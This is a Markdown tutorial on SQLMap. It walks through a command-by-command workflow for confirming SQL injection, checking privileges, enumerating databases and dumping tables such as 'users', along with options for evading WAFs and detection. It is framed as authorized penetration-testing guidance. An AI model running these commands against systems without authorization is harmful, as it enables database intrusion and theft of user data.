# SQLMap Guide

SQLMap is an automated tool for SQL injection and database takeover. This guide provides a structured approach to using SQLMap, including commands, workflows, and best practices for testing web applications (with explicit permission).

## Overview
SQLMap automates the process of identifying and exploiting SQL injection vulnerabilities. It supports various database management systems (e.g., MySQL, PostgreSQL, MSSQL) and offers options for enumerating databases, tables, and data.

## Prerequisites
- **Request File**: Create a `.txt` file (e.g., `request.txt`) capturing an HTTP request (e.g., via Burp Suite or browser developer tools) containing a potentially injectable parameter (e.g., `id=1` in a GET/POST request).
- **Permissions**: Ensure you have explicit authorization to test the target system.

## Basic SQLMap Command
```bash
sqlmap -r <request-file> --level 5 --risk 3
```
- `-r <request-file>`: Load the HTTP request from a file (e.g., `request.txt`).
- `--level 5`: Test all possible injection points (1-5, higher is more thorough).
- `--risk 3`: Include risky tests (1-3, higher increases risk of harmful queries).

## SQLMap Workflow
Follow this step-by-step process to enumerate and extract data from a vulnerable database:

1. **Test for SQL Injection**:
   ```bash
   sqlmap -r <request-file> --level 5 --risk 3
   ```
   - Confirms if the target is vulnerable to SQL injection.
   - If successful, proceed to the next steps.

2. **Check for DBA Privileges**:
   ```bash
   sqlmap -r <request-file> --level 5 --risk 3 --is-dba
   ```
   - Returns `True` if the user has database administrator privileges, `False` otherwise.

3. **Retrieve Database Banner**:
   ```bash
   sqlmap -r <request-file> --level 5 --risk 3 --banner
   ```
   - Displays the database management system version and operating system details.

4. **Enumerate Databases**:
   ```bash
   sqlmap -r <request-file> --level 5 --risk 3 --dbs
   ```
   - Lists all accessible databases on the server.

5. **Enumerate Tables in a Specific Database**:
   ```bash
   sqlmap -r <request-file> --level 5 --risk 3 -D <database_name> --tables
   ```
   - Replace `<database_name>` with a database name from the `--dbs` output (e.g., `admin_database`).
   - Lists all tables in the specified database.

6. **Dump Data from a Specific Table**:
   ```bash
   sqlmap -r <request-file> --level 5 --risk 3 -D <database_name> -T <table_name> --dump
   ```
   - Replace `<table_name>` with a table name from the `--tables` output (e.g., `users`).
   - Dumps the schema and data from the specified table.

**Example Workflow**:
```bash
sqlmap -r request.txt --level 5 --risk 3
sqlmap -r request.txt --level 5 --risk 3 --is-dba
sqlmap -r request.txt --level 5 --risk 3 --banner
sqlmap -r request.txt --level 5 --risk 3 --dbs
sqlmap -r request.txt --level 5 --risk 3 -D admin_database --tables
sqlmap -r request.txt --level 5 --risk 3 -D admin_database -T users --dump
```

## Useful SQLMap Options
- **Authentication**:
  - `--auth-type <type>`: Specify authentication type (e.g., `Basic`, `Digest`).
  - `--auth-cred <username:password>`: Provide credentials for authenticated requests.
- **Proxy Support**:
  - `--proxy <ip:port>`: Route traffic through a proxy (e.g., `--proxy 127.0.0.1:8080` for Burp Suite).
- **Performance**:
  - `--threads <number>`: Set the number of concurrent threads (e.g., `--threads 10` for faster scans).
  - `--batch`: Run in non-interactive mode, automatically selecting default options.
- **Data Extraction**:
  - `--columns`: List columns in a specific table (use with `-D <database> -T <table>`).
  - `--dump-all`: Dump all data from all databases (use cautiously, as it can be resource-intensive).
  - `--sql-query <query>`: Execute a custom SQL query (e.g., `--sql-query "SELECT * FROM users"`).
- **Stealth**:
  - `--random-agent`: Use a random User-Agent to evade detection.
  - `--delay <seconds>`: Add a delay between requests to avoid rate-limiting.
  - `--tamper <script>`: Use tamper scripts to bypass WAFs (e.g., `--tamper space2comment`).

**Example with Proxy and Authentication**:
```bash
sqlmap -r request.txt --level 5 --risk 3 --proxy 127.0.0.1:8080 --auth-type Basic --auth-cred admin:password --dbs
```

## Best Practices
1. **Start with Lower Levels/Risks**: Begin with `--level 1 --risk 1` to test safely, then increase if needed.
2. **Use a Request File**: Capture requests accurately to ensure SQLMap targets the correct parameters.
3. **Monitor Output**: Check SQLMap’s verbose output (`-v 3` or higher) for detailed debugging.
4. **Respect Legal Boundaries**: Only test systems with explicit permission to avoid legal issues.
5. **Combine with Manual Testing**: Use SQLMap alongside manual techniques to validate findings.
6. **Handle Large Dumps**: For large datasets, use `--start <row>` and `--stop <row>` to dump specific rows.

## Common Issues and Solutions
- **WAF Blocking**: Use `--tamper` scripts (e.g., `--tamper randomcase`) or `--random-agent` to bypass web application firewalls.
- **Rate Limiting**: Add `--delay 1` or reduce `--threads` to slow down requests.
- **Connection Errors**: Verify the target URL and request file, and ensure the proxy (if used) is correctly configured.

## Additional Notes
- **Output Storage**: SQLMap automatically saves results in `~/.sqlmap/output/<target>`. Use `--output-dir <path>` to specify a custom directory.
- **Tamper Scripts**: Explore `/usr/share/sqlmap/tamper/` for scripts to evade filters (e.g., `space2comment.py` replaces spaces with comments).
- **Documentation**: Run `sqlmap --help` or check the official SQLMap GitHub for advanced options.